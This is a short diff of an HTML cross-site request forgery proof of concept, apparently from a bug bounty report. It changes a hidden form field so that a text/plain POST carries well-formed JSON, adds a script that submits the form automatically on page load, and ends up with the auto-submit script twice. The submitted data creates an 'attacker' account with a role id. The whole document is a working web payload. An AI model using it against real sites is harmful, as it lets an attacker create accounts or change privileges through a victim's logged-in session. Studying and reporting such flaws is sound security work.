@@ -7,9 +7,12 @@
       method="POST"
       enctype="text/plain">
   <input type="hidden"
-         name="data"
-         value='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us"}'>
+         name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us","foo":"'
+         value='bar"}'>
 </form>
+<script>
+  document.getElementById("csrfForm").submit();
+</script>
 <script>
   document.getElementById("csrfForm").submit();
 </script>
